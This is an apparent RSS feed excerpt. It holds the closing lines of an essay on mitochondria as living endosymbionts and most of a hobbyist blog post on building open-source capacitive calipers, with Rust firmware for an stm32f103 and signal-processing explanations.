complexity emerges in biological systems with the creation of eukaryotes and the rise of multicellularity. By revisiting our understanding of mitochondria, we will similarly break down long-held scientific dogmas.</p><p><span>In the early 20th century, Albert Einstein and Claude Shannon laid out the three pillars of the physical world: matter, information, and energy. When Francis Crick and James Watson published their model of the DNA double helix, they created a paradigm shift in our ability to understand and control the first two: matter and information. In the 70 years since then, weâ€™ve developed powerful tools to study genes, decode how information moves through cells, and manipulate DNA using tools such as CRISPR-based gene editing. However, we have not yet reached an equal level of understanding of, or tools to manipulate, biological </span><em>energy</em><span>. Just as CRISPR enabled scientists to rewrite the code of life, we need similar tools to engineer mitochondria and control bioenergetics across the eukaryotic tree of life.</span></p><p>Despite more than a billion years of evolution, mitochondria still play critical roles within cells; they have not been displaced or rendered obsolete. This means that, as humans evolved, so too did the role of mitochondria in shaping our health and longevity. Mitochondrial dysfunction has long been linked to cardiovascular disorders, diabetes, Alzheimers, Parkinsons, amyotrophic lateral sclerosis, and other age-related diseases. In patients with these conditions, the mitochondria adopt abnormal and fragmented morphologies, failing to make enough energy for cells or sending improper communication signals. The diseased mitochondria gradually make toxic compounds that accelerate cell death.&nbsp;</p><p>Perhaps one of the paths to solving energy-related diseases, extending lifespan, or even engineering processes like photosynthesis lies in the complex interaction between our cells and the other lifeforms so actively inhabiting them. To find out, letâ€™s embrace these eons-old alliances.</p><p><em>Thanks to Kate Adamala, Zeno Fox, Michael Retchin, Niko McCarty, and Ed Boyden for helpful feedback on this essay.</em></p><p><strong>Liyam Chitayat </strong><span>is a Hertz Fellow and PhD student at MIT working on synthetic endosymbiosis and building an initiative to integrate and accelerate the field. Liyam is also a Fellow of The Council on Strategic Risk.</span></p><p><strong>Cite: </strong><span>Liyam Chitayat. â€œMitochondria Are Aliveâ€ </span><em>Asimov Press </em><span>(2024). DOI: https://doi.org/10.62211/38pe-75hu</span></p></div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Making Electronic Calipers (102 pts)]]></title>
            <link>https://kevinlynagh.com/calipertron/</link>
            <guid>42087560</guid>
            <pubDate>Fri, 08 Nov 2024 15:29:27 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://kevinlynagh.com/calipertron/">https://kevinlynagh.com/calipertron/</a>, See on <a href="https://news.ycombinator.com/item?id=42087560">Hacker News</a></p>
<div id="readability-page-1" class="page"><div><p><a href="https://kevinlynagh.com/">â† Back to Kevin's homepage</a><span>Published: 2024 November 2</span></p><p>Have you ever wished for a 500 Hz, millimeter-precise linear position sensing system?
Well youâ€™re in luck â€” all you need is some circuit board, a basic microcontroller, and a wee bit of maths!</p>

<video src="https://kevinlynagh.com/calipertron/2024_11_02_caliper_demo.mp4" controls="true" loop="true" autoplay="true"></video>

<p>See also the <a href="https://github.com/lynaghk/calipertron/">full source code and my research log</a> for this project.</p>

<h2 id="why-make-calipers">Why make calipers?</h2>

<p>Electronic calipers are awesome.
<a href="https://amzn.to/3BVZhvB">This \$30 pair</a> has served me well for years, reading far more precision than my skills justify:</p>

<p><img src="https://kevinlynagh.com/calipertron/calipers.png" alt="calipers"></p>

<p>Such calipers work via capacitive coupling between a PCB on the powered slidey display and a passive PCB â€œscaleâ€ in the stationary spine.</p>

<p>Back in March, I idly wondered if the same working principle could be used for a cheap and cheerful â€œmaker-friendlyâ€ positioning system.
E.g., slide some passive PCB scales into an aluminum extrusion rail, add a capacitive pickup to the bottom of whatever carriage youâ€™ve got riding along, and <em>tada</em> â€” youâ€™ve got sub-mm closed-loop positioning.
All for the cost of some PCB, a few GPIO pins, and some firmware (so free, basically).</p>

<p>I figured someone else mustâ€™ve done this before, but I wasnâ€™t able to find any â€œopen source caliperâ€ projects.
The closest was <a href="https://hackaday.io/project/194778-diy-digital-caliper-calipatron/log/227428-research">this hackaday.io project page</a>, started literally a month before.</p>

<p>I reached out to the author, Mitko, and offered to implement the firmware if they sent me a PCB.
My main motivation was to learn some digital signal processing, as Iâ€™d never studied it beyond a passing undergrad mention of the Fourier transform.</p>

<p>If you just want some off-the-shelf precision measurements and donâ€™t want to go on <em>An Adventure</em>, you may want to consider instead:</p>

<ul>
<li>reading measurement data directly out of cheap calipers via their <a href="https://hackaday.com/2016/05/17/improved-digital-caliper-interfacing-including-3d-printed-connector/">secret data interface</a></li>
<li>searching for â€œdigital read outâ€ (DRO) kits, which is the generic term for all sorts of capacitive, optical, and magnetic precision linear and angular measurement schemes (typically for retrofitting manual machine equipment with a digital readout, so <em>you</em> can be the â€œ<a href="https://en.wikipedia.org/wiki/Numerical_control">NC</a>â€ of â€œCNCâ€). E.g., this  <a href="https://www.sra-measurement.com/digital-readout-systems/magnetic-linear-encoder-reading-head-1-micron-resolution">\$200 magnetic encoder</a> with some <a href="https://www.sra-measurement.com/high-accuracy-magnetic-linear-tape">\$1/cm linear tape</a>.)</li>
</ul>

<h2 id="caliper-theory">Caliper theory</h2>

<p>Hereâ€™s a photo of calipers disassembled by my collaborator Mitko (annotations mine):</p>

<p><img src="https://kevinlynagh.com/calipertron/book_calipers.jpg" alt=""></p>

<p>The left half is the caliperâ€™s stationary metal spine, which contains a passive PCB with a pattern of â€œreflectorsâ€ (which look sorta like the capital letter â€œTâ€ rotated 90 degrees clockwise).</p>

<p>The right half is the powered display part of the calipers, which slides up and down along the metal stem; this PCB has a long receiver pad and a bunch of emitter pads that look like the keys of a piano.</p>

<p>When assembled (folded together like a book), the reflector â€œTâ€ stems are over top the signal-emitting piano keys and the reflector â€œTâ€ crossbars are over the receiver pad.</p>

<p>(Pedant note: Thereâ€™s not actually any â€œreflectionâ€ going on, the plates are capacitively coupled. I just find the term â€œreflectorâ€ conveys the right vibe.)</p>

<p>Hereâ€™s a close up, taken from Big Cliveâ€™s excellent caliper <a href="https://youtu.be/fKSSY1gzCEs?t=588">teardown video</a> (annotations mine):</p>

<p><img src="https://kevinlynagh.com/calipertron/diagram.jpg" alt=""></p>

<p>The top half is the stationary part and the bottom half is slidey part.</p>

<p>Note the following details of the geometry:</p>

<ul>
<li>The slidey part emits 8 signals through the little piano keys (labeled), which repeat along the entire length.</li>
<li>The reflector plate stems are exactly 4 keys wide.</li>
</ul>

<p>In essence, the reflector plate â€œadds upâ€ the signals of the piano keys underneath it (in this photo, signals 0, 1, 2, and 3).</p>

<p>Imagine sliding the caliper display 0.5 keys to the right.
Then the reflectors would be above <em>half</em> of signal 0, all of signals 1, 2, 3, and half of signal 4.
Sliding another 0.5 keys to the right, the reflectors would then be on top of signals 1, 2, 3, and 4.</p>

<p>The reflectors are just passive pieces of metal; all they can do is sum together the signals coupled to them.
This summed signal is then reflected back to the slidey partâ€™s single receiver pad.</p>

<p>So what are the 8 signals you should emit?</p>

<p>If you use sine waves at the same frequency but different phases, then their reflected sum will always be a sine wave of the original frequency, with some combined phase and amplitude (<a href="https://www.johndcook.com/blog/2020/08/17/adding-phase-shifted-sine-waves/">proof</a>).</p>

<p>That is: <strong>as you move the slidey part, the phase offset of the reflected signal changes</strong>.</p>

<p>Since we have 8 signals, if we evenly divide the unit circle so that the nth signal is:</p>

<p>$$\sin\left( 2\pi f + 2\pi\frac{n}{8} \right)$$</p>

<p>then we can track the cumulative phase offset of the received signal (relative to some initial position) and know that every $2\pi$ moved in phase space corresponds to a linear movement 8 emitter keys wide.</p>

<h2 id="microcontroller-implementation">Microcontroller implementation</h2>

<p>Mitko mailed me version 1.1 of his PCB (<a href="https://github.com/MitkoDyakov/Calipatron/blob/444c72c3e81eab0a2e7ee198f5574062dc1fc510/Hardware/V1.1/Schematics%20V1.1.pdf">schematic</a>), which is built around an stm32f103 microcontroller.</p>

<p>I wrote the firmware using the <a href="https://github.com/embassy-rs/embassy">Embassy Rust framework</a>, which worked reasonably well.
(â€œWellâ€ as far as embedded goes â€” there was a side quest tracking down an intermittent freeze that locked out the debugger, which seems to be a genuine hardware bug triggered only on <a href="https://github.com/lynaghk/repro-stm32f103-rust-embassy-freeze/">older ARM core silicon revisions</a>.)</p>

<p>The firmware needs to:</p>

<ul>
<li>emit 8 sinusoidal waves</li>
<li>measure the reflected sum calculate the phase offset</li>
</ul>

<p>Letâ€™s take these in turn.</p>

<h2 id="emitting-sinusoidal-waves">Emitting sinusoidal waves</h2>

<p>The stm32f103 doesnâ€™t have a digital to analog converter, but we can emit a sinusoidal wave using â€œpulse density modulationâ€ (PDM).
The technique is similar to PWM (â€œpulse width modulationâ€) in that an analog signal level is approximated by having a digital signal stay â€œonâ€ for the appropriate fraction of time.
But while PWM has its â€œonâ€ fraction all at once, the PDM signal spaces it out across the sample window.</p>

<p>For example, to represent an analog level of 50% using 8 pulses:</p>
<div><pre><span></span>PWM: X X X X . . . .
PDM: X . X . X . X .
</pre></div>
<p>the PWM signal stays high (<code>x</code>) for the first half of the period, whereas the PDM signal alternates.
This is preferable for our use case, since it means the switching noise is at a higher frequency, further away from our lower frequency sinusoidal wave.</p>

<p>We need all of the waves to move in lockstep with each other, so rather than updating the pins one-by-one, we update all of them with a single 32-bit write to the GPIOâ€™s â€œbit set reset registerâ€ (BSRR).</p>

<p>Furthermore, since we know how many PDM samples we want in advance, we can take pity on our lilâ€™ stm32f103 (which doesnâ€™t even have a hardware floating point unit) and calculate all of the BSRR values at compile-time.
Rustâ€™s formal compile-time machinery <a href="https://users.rust-lang.org/t/constant-trigonometry/58565">doesnâ€™t support trigonometry</a>, so we use a <code>build.rs</code> script to generate a string of code at compile-time:</p>
<div><pre><span></span><span>fn</span> <span>generate_pdm_bsrr</span><span>(</span><span>n_samples</span>: <span>usize</span><span>)</span><span> </span>-&gt; <span>String</span> <span>{</span><span></span>
<span>    </span><span>let</span><span> </span><span>mut</span><span> </span><span>output</span><span> </span><span>=</span><span> </span><span>String</span>::<span>new</span><span>();</span><span></span>
<span>    </span><span>output</span><span>.</span><span>push_str</span><span>(</span><span>"pub const PDM_SIGNAL: [u32; "</span><span>);</span><span></span>
<span>    </span><span>output</span><span>.</span><span>push_str</span><span>(</span><span>&amp;</span><span>n_samples</span><span>.</span><span>to_string</span><span>());</span><span></span>
<span>    </span><span>output</span><span>.</span><span>push_str</span><span>(</span><span>"] = [</span><span>\n</span><span>"</span><span>);</span><span></span>

<span>    </span><span>let</span><span> </span><span>n_waves</span><span> </span><span>=</span><span> </span><span>8</span><span>;</span><span></span>

<span>    </span><span>let</span><span> </span><span>mut</span><span> </span><span>errors</span><span> </span><span>=</span><span> </span><span>vec!</span><span>[</span><span>0.0</span><span>;</span><span> </span><span>n_waves</span><span>];</span><span></span>
<span>    </span><span>for</span><span> </span><span>sample</span><span> </span><span>in</span><span> </span><span>0</span><span>..</span><span>n_samples</span><span> </span><span>{</span><span></span>
<span>        </span><span>let</span><span> </span><span>mut</span><span> </span><span>bsrr</span><span> </span><span>=</span><span> </span><span>0</span><span>u32</span><span>;</span><span></span>
<span>        </span><span>for</span><span> </span><span>wave</span><span> </span><span>in</span><span> </span><span>0</span><span>..</span><span>n_waves</span><span> </span><span>{</span><span></span>
<span>            </span><span>let</span><span> </span><span>phase_offset</span><span> </span><span>=</span><span> </span><span>2.0</span><span> </span><span>*</span><span> </span><span>PI</span><span> </span><span>*</span><span> </span><span>(</span><span>wave</span><span> </span><span>as</span><span> </span><span>f64</span><span>)</span><span> </span><span>/</span><span> </span><span>(</span><span>n_waves</span><span> </span><span>as</span><span> </span><span>f64</span><span>);</span><span></span>
<span>            </span><span>let</span><span> </span><span>angle</span><span> </span><span>=</span><span> </span><span>2.0</span><span> </span><span>*</span><span> </span><span>PI</span><span> </span><span>*</span><span> </span><span>(</span><span>sample</span><span> </span><span>as</span><span> </span><span>f64</span><span> </span><span>/</span><span> </span><span>n_samples</span><span> </span><span>as</span><span> </span><span>f64</span><span>)</span><span> </span><span>+</span><span> </span><span>phase_offset</span><span>;</span><span></span>
<span>            </span><span>let</span><span> </span><span>cosine</span><span> </span><span>=</span><span> </span><span>angle</span><span>.</span><span>cos</span><span>()</span><span> </span><span>as</span><span> </span><span>f32</span><span>;</span><span></span>
<span>            </span><span>let</span><span> </span><span>normalized_signal</span><span> </span><span>=</span><span> </span><span>(</span><span>cosine</span><span> </span><span>+</span><span> </span><span>1.0</span><span>)</span><span> </span><span>/</span><span> </span><span>2.0</span><span>;</span><span></span>

<span>            </span><span>if</span><span> </span><span>normalized_signal</span><span> </span><span>&gt;</span><span> </span><span>errors</span><span>[</span><span>wave</span><span>]</span><span> </span><span>{</span><span></span>
<span>                </span><span>bsrr</span><span> </span><span>|=</span><span> </span><span>1</span><span> </span><span>&lt;&lt;</span><span> </span><span>wave</span><span>;</span><span> </span><span>// set bit</span>
<span>                </span><span>errors</span><span>[</span><span>wave</span><span>]</span><span> </span><span>+=</span><span> </span><span>1.0</span><span> </span><span>-</span><span> </span><span>normalized_signal</span><span>;</span><span></span>
<span>            </span><span>}</span><span> </span><span>else</span><span> </span><span>{</span><span></span>
<span>                </span><span>bsrr</span><span> </span><span>|=</span><span> </span><span>1</span><span> </span><span>&lt;&lt;</span><span> </span><span>(</span><span>wave</span><span> </span><span>+</span><span> </span><span>16</span><span>);</span><span> </span><span>// reset bit</span>
<span>                </span><span>errors</span><span>[</span><span>wave</span><span>]</span><span> </span><span>-=</span><span> </span><span>normalized_signal</span><span>;</span><span></span>
<span>            </span><span>}</span><span></span>
<span>        </span><span>}</span><span></span>
<span>        </span><span>output</span><span>.</span><span>push_str</span><span>(</span><span>&amp;</span><span>format!</span><span>(</span><span>"    {:#034b},</span><span>\n</span><span>"</span><span>,</span><span> </span><span>bsrr</span><span>));</span><span></span>
<span>    </span><span>}</span><span></span>

<span>    </span><span>output</span><span>.</span><span>push_str</span><span>(</span><span>"];</span><span>\n</span><span>"</span><span>);</span><span></span>
<span>    </span><span>output</span><span></span>
<span>}</span><span></span>
</pre></div>
<p>This emitted string is then written to a file, which we <code>import</code> as usual from our main code namespace.
The <code>PDM_SIGNAL</code> const slice is then baked into the firmware, and at runtime a hardware timer and a DMA task is used copy each value directly to BSRR at a fixed rate.
This prevents any jitter in the emitted signal, as after starting the transmission the CPU is no longer involved.</p>

<h2 id="measuring-phase-offset">Measuring phase offset</h2>

<p>The reflected composite wave is measured by the stm32f103â€™s ADC.
A DMA task is triggered at the same time as the emitted PDM signals, and it reads a fixed number of samples into a buffer.</p>

<p>So how do we get the phase offset?</p>

<p>If youâ€™re like me, the first thing you need to do is read some textbooks to figure out whatâ€™s what.
I recommend <a href="https://amzn.to/3MDLdZN">Understanding Digital Signal Processing</a> by Richard Lyons, as the book has a casual friendly style and is clearly written by an experienced engineer â€” the final chapter is simply 150 pages of â€œDigital Signal Processing Tricksâ€!</p>

<p>Anyway, we know from earlier that our reflected signal $s(t)$ is the sum of the sinusoidal signals that we emitted, so it must also be a sinusoid with some phase offset; letâ€™s call it $A \cos( \omega t + \phi)$ (with $A$ some constant representing a change in amplitude due to our capacitive coupling, amplification, etc. compared to our original emitted signal).</p>

<p>Then as Iâ€™m sure you recall from <a href="https://mathworld.wolfram.com/TrigonometricAdditionFormulas.html">trigonometric addition formula</a> from grade school, we can rewrite this as:</p>

<p>$$
\begin{align}
s(t) &amp;= A \cos( \omega t + \phi)\newline
     &amp;= A \left[ \cos( \omega t)\cos(\phi) - \sin( \omega t)\sin(\phi) \right]
\end{align}
$$</p>

<p>If we correlate our signal with $\cos(\omega t)$ then weâ€™re left with $A \cos(\phi)$, and similarly for sin.
Thus:</p>

<p>$$
\begin{align}
\frac{\mathrm{Corr}\left(s(t), \sin(\omega t)\right)}{\mathrm{Corr}\left(s(t), \cos(\omega t)\right)} &amp;= \frac{A \sin(\phi)} {A \cos(\phi)} \newline
\arctan\left(\frac{\mathrm{Corr}\left(s(t), \sin(\omega t)\right)}{\mathrm{Corr}\left(s(t), \cos(\omega t)\right)}\right) &amp;= \phi
\end{align}
$$</p>

<p>The correlation operator itself is simple: itâ€™s the sum of the product of the two signals at matching points in time.</p>

<p>All we need to do is figure out the exact times of our $s(t)$ samples, which can be derived by the sampling rate of the ADC.</p>

<p>All of the terms besides our measured signal samples $s(t)$ are knowable at compile-time, so we can again generate a lookup table for our microcontroller to use:</p>
<div><pre><span></span><span>fn</span> <span>generate_sine_cosine_table</span><span>(</span><span></span>
<span>    </span><span>signal_frequency</span>: <span>f64</span><span>,</span><span></span>
<span>    </span><span>sampling_frequency</span>: <span>f64</span><span>,</span><span></span>
<span>    </span><span>num_samples</span>: <span>usize</span><span>,</span><span></span>
<span>)</span><span> </span>-&gt; <span>String</span> <span>{</span><span></span>
<span>    </span><span>let</span><span> </span><span>mut</span><span> </span><span>output</span><span> </span><span>=</span><span> </span><span>String</span>::<span>new</span><span>();</span><span></span>
<span>    </span><span>output</span><span>.</span><span>push_str</span><span>(</span><span>"pub const SINE_COSINE_TABLE: [(f32, f32); "</span><span>);</span><span></span>
<span>    </span><span>output</span><span>.</span><span>push_str</span><span>(</span><span>&amp;</span><span>num_samples</span><span>.</span><span>to_string</span><span>());</span><span></span>
<span>    </span><span>output</span><span>.</span><span>push_str</span><span>(</span><span>"] = [</span><span>\n</span><span>"</span><span>);</span><span></span>

<span>    </span><span>for</span><span> </span><span>i</span><span> </span><span>in</span><span> </span><span>0</span><span>..</span><span>num_samples</span><span> </span><span>{</span><span></span>
<span>        </span><span>let</span><span> </span><span>angle</span><span> </span><span>=</span><span> </span><span>2.0</span><span> </span><span>*</span><span> </span><span>PI</span><span> </span><span>*</span><span> </span><span>signal_frequency</span><span> </span><span>*</span><span> </span><span>(</span><span>i</span><span> </span><span>as</span><span> </span><span>f64</span><span> </span><span>*</span><span> </span><span>(</span><span>1.0</span><span> </span><span>/</span><span> </span><span>sampling_frequency</span><span>));</span><span></span>
<span>        </span><span>let</span><span> </span><span>sine</span><span> </span><span>=</span><span> </span><span>angle</span><span>.</span><span>sin</span><span>()</span><span> </span><span>as</span><span> </span><span>f32</span><span>;</span><span></span>
<span>        </span><span>let</span><span> </span><span>cosine</span><span> </span><span>=</span><span> </span><span>angle</span><span>.</span><span>cos</span><span>()</span><span> </span><span>as</span><span> </span><span>f32</span><span>;</span><span></span>
<span>        </span><span>output</span><span>.</span><span>push_str</span><span>(</span><span>&amp;</span><span>format!</span><span>(</span><span>"    ({:?}, {:?}),</span><span>\n</span><span>"</span><span>,</span><span> </span><span>sine</span><span>,</span><span> </span><span>cosine</span><span>));</span><span></span>
<span>    </span><span>}</span><span></span>

<span>    </span><span>output</span><span>.</span><span>push_str</span><span>(</span><span>"];</span><span>\n</span><span>"</span><span>);</span><span></span>
<span>    </span><span>output</span><span></span>
<span>}</span><span></span>
</pre></div>
<p>The build.rs script is then:</p>
<div><pre><span></span><span>fn</span> <span>main</span><span>()</span><span> </span><span>{</span><span></span>

<span>    </span><span>// lol, compile-time-programming by literally writing code to a file that we import</span>
<span>    </span><span>let</span><span> </span><span>out_dir</span><span> </span><span>=</span><span> </span><span>std</span>::<span>env</span>::<span>var</span><span>(</span><span>"OUT_DIR"</span><span>).</span><span>unwrap</span><span>();</span><span></span>
<span>    </span><span>let</span><span> </span><span>dest_path</span><span> </span><span>=</span><span> </span><span>std</span>::<span>path</span>::<span>Path</span>::<span>new</span><span>(</span><span>&amp;</span><span>out_dir</span><span>).</span><span>join</span><span>(</span><span>"constants.rs"</span><span>);</span><span></span>
<span>    </span><span>let</span><span> </span><span>mut</span><span> </span><span>f</span><span> </span><span>=</span><span> </span><span>File</span>::<span>create</span><span>(</span><span>&amp;</span><span>dest_path</span><span>).</span><span>unwrap</span><span>();</span><span></span>

<span>    </span><span>let</span><span> </span><span>pdm_frequency</span>: <span>u32</span> <span>=</span><span> </span><span>100_000</span><span>;</span><span> </span><span>// 100 kHz</span>
<span>    </span><span>f</span><span>.</span><span>write_all</span><span>(</span><span>format!</span><span>(</span><span>"pub const PDM_FREQUENCY: u32 = {:?};</span><span>\n</span><span>"</span><span>,</span><span> </span><span>pdm_frequency</span><span>).</span><span>as_bytes</span><span>())</span><span></span>
<span>        </span><span>.</span><span>unwrap</span><span>();</span><span></span>

<span>    </span><span>let</span><span> </span><span>pdm_length</span><span> </span><span>=</span><span> </span><span>128</span><span>;</span><span></span>

<span>    </span><span>let</span><span> </span><span>num_samples</span><span> </span><span>=</span><span> </span><span>512</span><span>;</span><span></span>
<span>    </span><span>let</span><span> </span><span>signal_frequency</span><span> </span><span>=</span><span> </span><span>pdm_frequency</span><span> </span><span>as</span><span> </span><span>f64</span><span> </span><span>/</span><span> </span><span>pdm_length</span><span> </span><span>as</span><span> </span><span>f64</span><span>;</span><span></span>
<span>    </span><span>let</span><span> </span><span>adc_frequency</span><span> </span><span>=</span><span> </span><span>12_000_000.</span><span>;</span><span></span>
<span>    </span><span>let</span><span> </span><span>adc_sample_cycles</span><span> </span><span>=</span><span> </span><span>71.5</span><span>;</span><span></span>
<span>    </span><span>let</span><span> </span><span>adc_sample_overhead_cycles</span><span> </span><span>=</span><span> </span><span>12.5</span><span>;</span><span> </span><span>// see reference manual section 11.6</span>
<span>    </span><span>let</span><span> </span><span>sampling_frequency</span><span> </span><span>=</span><span> </span><span>adc_frequency</span><span> </span><span>/</span><span> </span><span>(</span><span>adc_sample_cycles</span><span> </span><span>+</span><span> </span><span>adc_sample_overhead_cycles</span><span>);</span><span></span>

<span>    </span><span>f</span><span>.</span><span>write_all</span><span>(</span><span></span>
<span>        </span><span>generate_sine_cosine_table</span><span>(</span><span>signal_frequency</span><span>,</span><span> </span><span>sampling_frequency</span><span>,</span><span> </span><span>num_samples</span><span>).</span><span>as_bytes</span><span>(),</span><span></span>
<span>    </span><span>)</span><span></span>
<span>    </span><span>.</span><span>unwrap</span><span>();</span><span></span>

<span>    </span><span>f</span><span>.</span><span>write_all</span><span>(</span><span>generate_pdm_bsrr</span><span>(</span><span>pdm_length</span><span>).</span><span>as_bytes</span><span>())</span><span></span>
<span>        </span><span>.</span><span>unwrap</span><span>();</span><span></span>

<span>    </span><span>/// ...</span>
<span>}</span><span></span>
</pre></div>
<p>Finally, at runtime weâ€™re left with this loop:</p>
<div><pre><span></span><span>loop</span><span> </span><span>{</span><span></span>

<span>  </span><span>// start PDM emission via DMA</span>
<span>  </span><span>// start ADC via DMA</span>
<span>  </span><span>// wait for ADC to read NUM_SAMPLES</span>
<span>  </span><span>// then...</span>

<span>  </span><span>let</span><span> </span><span>mut</span><span> </span><span>sum_sine</span>: <span>f32</span> <span>=</span><span> </span><span>0.0</span><span>;</span><span></span>
<span>  </span><span>let</span><span> </span><span>mut</span><span> </span><span>sum_cosine</span>: <span>f32</span> <span>=</span><span> </span><span>0.0</span><span>;</span><span></span>

<span>  </span><span>let</span><span> </span><span>adc_buf</span><span> </span><span>=</span><span> </span><span>unsafe</span><span> </span><span>{</span><span> </span><span>&amp;</span><span>ADC_BUF</span><span>[</span><span>..</span><span>]</span><span> </span><span>};</span><span></span>

<span>  </span><span>for</span><span> </span><span>i</span><span> </span><span>in</span><span> </span><span>0</span><span>..</span><span>NUM_SAMPLES</span><span> </span><span>{</span><span></span>
<span>      </span><span>let</span><span> </span><span>(</span><span>sine</span><span>,</span><span> </span><span>cosine</span><span>)</span><span> </span><span>=</span><span> </span><span>SINE_COSINE_TABLE</span><span>[</span><span>i</span><span>];</span><span></span>
<span>      </span><span>sum_sine</span><span> </span><span>+=</span><span> </span><span>adc_buf</span><span>[</span><span>i</span><span>]</span><span> </span><span>as</span><span> </span><span>f32</span><span> </span><span>*</span><span> </span><span>sine</span><span>;</span><span></span>
<span>      </span><span>sum_cosine</span><span> </span><span>+=</span><span> </span><span>adc_buf</span><span>[</span><span>i</span><span>]</span><span> </span><span>as</span><span> </span><span>f32</span><span> </span><span>*</span><span> </span><span>cosine</span><span>;</span><span></span>
<span>  </span><span>}</span><span></span>
<span>  </span><span>let</span><span> </span><span>phase</span><span> </span><span>=</span><span> </span><span>sum_sine</span><span>.</span><span>atan2</span><span>(</span><span>sum_cosine</span><span>);</span><span></span>

<span>  </span><span>// add latest phase reading to position estimation.</span>
<span>  </span><span>// this object also handles wraparound and hysteresis.</span>
<span>  </span><span>position_estimator</span><span>.</span><span>update</span><span>(</span><span>phase</span><span>);</span><span></span>
<span>  </span><span>info</span><span>!</span><span>(</span><span>"Phase: {} Position: {}"</span><span>,</span><span> </span><span>phase</span><span>,</span><span> </span><span>position_estimator</span><span>.</span><span>position</span><span>);</span><span></span>

<span>  </span><span>if</span><span> </span><span>user_button</span><span>.</span><span>is_low</span><span>()</span><span> </span><span>{</span><span></span>
<span>      </span><span>info</span><span>!</span><span>(</span><span>"Button pressed, zeroing"</span><span>);</span><span></span>
<span>      </span><span>position_estimator</span><span>.</span><span>position</span><span> </span><span>=</span><span> </span><span>0.</span><span>;</span><span></span>
<span>  </span><span>}</span><span></span>
<span>}</span><span></span>
</pre></div>
<h2 id="precision">Precision</h2>

<p>There are several parameters we need to select in the firmware to implement the measurement:</p>

<ul>
<li>The frequency at which we emit the PDM pulses</li>
<li>The number of PDM pulses across which we divide a single sinusoid period</li>
<li>The ADC sampling time</li>
<li>The number of ADC samples we take for each phase calculation</li>
</ul>

<p>Rather than try to calculate the ideal parameters from first principles (which would probably depend on all sorts of specifics like the PCB soldermask thickness and trace resistances), letâ€™s just try them all and see what works best.
More specifically: for each parameter configuration, which has the lowest standard deviation for multiple measurements taken from the same physical slide position?</p>

<p>Instead of reflashing the firmware for each set of parameters, we can write a special <a href="https://github.com/lynaghk/calipertron/blob/2ceedc0e477498601dcbd6a6f257012657070bf9/firmware/src/bin/recorder.rs">recorder firmware</a> that can be controlled by a laptop to try different parameters configurations.
Then we can stream  the raw ADC readings back to the laptop, which lets us try a much wider variety parameters.</p>

<p>You can look at the <a href="https://github.com/lynaghk/calipertron/blob/2ceedc0e477498601dcbd6a6f257012657070bf9/analysis/parameter_sweep.ipynb">parameter sweep notebook</a> for the gory details, but hereâ€™s the summary in a plot:</p>

<p><img src="https://kevinlynagh.com/calipertron/parameter_sweep.jpg" alt=""></p>

<p>Thereâ€™s a lot going on here, letâ€™s break it down.
Schematically:</p>

<ul>
<li>The Y-axis corresponds to the standard deviation of recorded phases (lower is better â€” after all, the slide is never moving, so ideally all measurements would return the same value)</li>
<li>The X-axis corresponds to the frequency for which weâ€™re sending out the PDM pulses of the emitted sinusoidal signal. All data here are for 128 PDM segments and an X-axis spacing of 2 kHz.</li>
<li>Each sub-plot corresponds to a different â€œwindow sizeâ€ â€” i.e., how many ADC samples we correlate to derive a single phase measurement.</li>
<li>Each colored line is a different ADC sampling frequency (the stm32f103â€™s ADC can sample over 8 different periods, and weâ€™re trying all of them)</li>
</ul>

<p>What stands out to me in the data itself:</p>

<ul>
<li>The higher the ADC frequency, the higher the PDM frequency needs to be before we start to pick up the signal (i.e., for the standard deviation to drop).
This makes sense to me, as if the ADC frequency is much higher than the signalâ€™s, our window of samples wonâ€™t see the signal change much at all, so itâ€™s going to be dominated by noise and weâ€™ll have no idea what the phase is.</li>
<li>Increasing the window size tends to improve precision â€” makes sense, as it means weâ€™re looking at more samples and (presumably) reducing the effect of noise.</li>
<li>The lowest ADC sampling frequency (i.e., the longest ADC sampling period) tends to have the best performance.</li>
<li>Thereâ€™s a strange cat at 250 kHz; this is probably the point at which our ADC sampling rate isnâ€™t fast enough to keep up with the signal itself. With 250 kHz / 128 PDM segments implies our emitted sinusoid is at about 1950 Hz</li>
</ul>

<p>While in this static test increasing the window size and ADC sampling period looks best, that does mean itâ€™ll reduce the rate at which we can actually calculate the phase, which limits how fast the slider can move before it loses track of its absolute position.</p>

<p>So, based on this survey I decided to set the parameters for the local, in-firmware calculation (as seen in the demo video) to be the point indicated by the red arrow:</p>

<ul>
<li>window size = 128</li>
<li>PDM frequency = 222 kHz</li>
<li>ADC sampling frequency = 222.2 kHz</li>
</ul>

<p>It actually makes sense that the phase deviation is a minimum here: At this ADC sampling frequency and a window size of 128, weâ€™re pretty much matching a full period of the emitted 128-segment PDM signal.</p>

<p>The timestamps in the demo video show about 1.5 ms between readings (0.6 kHz), which is about three times the ideal limit (222.2 kHz / 128 samples =&gt; 1.7 kHz), probably due to the time it takes to do correlation math, print to the host computer, and cycle through the Embassy async machinery.
Iâ€™m sure a more optimized implementation could hit the limit by, e.g., calculating the correlations while the samples are being collected rather than afterwards.</p>

<p>As for the precision, taking 200ms worth of phase measurements from the printed logs (n = 124) while the slide isnâ€™t moving, the standard deviation of the phase is 0.039 radians, which (for my PCB with 8 emitter keys = 9.4 mm) is a position error of about $ 0.039 * 9.4\,\mathrm{mm} / 2\pi = 0.6\,\mathrm{mm}$.</p>

<p>Honestly, this is way better than I expected â€” especially since the stm32f103 came out in 2007, the drive signal is created by just banging on GPIO, and only conditioning for the received signal is a fixed-gain amplifier (weâ€™re not even filtering out the 50 Hz line noise).</p>

<h2 id="misc-tips-lessons-learned">Misc. tips / lessons learned</h2>

<ul>
<li>Iâ€™m very happy with the workflow of streaming raw data to my computer over USB and then doing analysis in Python notebooks. This was also helpful for letting continue work on the project while I was traveling and away from the working hardware.</li>
<li>Iâ€™m not super-well versed in the Python ecosystem, and it was spectacular asking LLMs like Claude stuff like, â€œCan you please plot an FFT of these data samplesâ€, â€œRun these bad boys through a low pass filter at with cutoff at 1000 Hzâ€, â€œCan you please write an a phase accumulator that handles wraparound correctlyâ€, etc. Being able to use <a href="https://kevinlynagh.com/newsletter/2024_10_transcription_app_art_wall/">my lightweight dictation app</a> to just ramble out thoughts/ideas at an LLM was particularly satisfying.</li>
<li>Even with LLM-assistance, plotting was more difficult than I expected:

<ul>
<li>The JS-based interactive plots (Plotly, etc.) blew up when I tried to visualize raw data with just ~100k samples.</li>
<li>The matplotlib-based static plotting libraries didnâ€™t make it easy to read exact coordinates from a point on the plot interactively.</li>
